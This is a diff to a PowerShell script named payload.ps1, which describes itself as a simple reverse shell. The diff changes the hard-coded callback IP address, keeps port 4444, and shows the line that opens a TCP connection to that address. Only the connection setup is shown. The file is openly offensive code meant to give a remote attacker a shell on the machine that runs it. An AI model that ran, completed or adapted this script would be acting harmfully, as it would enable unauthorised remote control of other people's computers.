@@ -1,5 +1,5 @@
 # payload.ps1 - Simple reverse shell
-$ip = "192.168.43.2"  # ← yes
+$ip = "192.168.1.4"  # ← yes
 $port = 4444
 
 $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
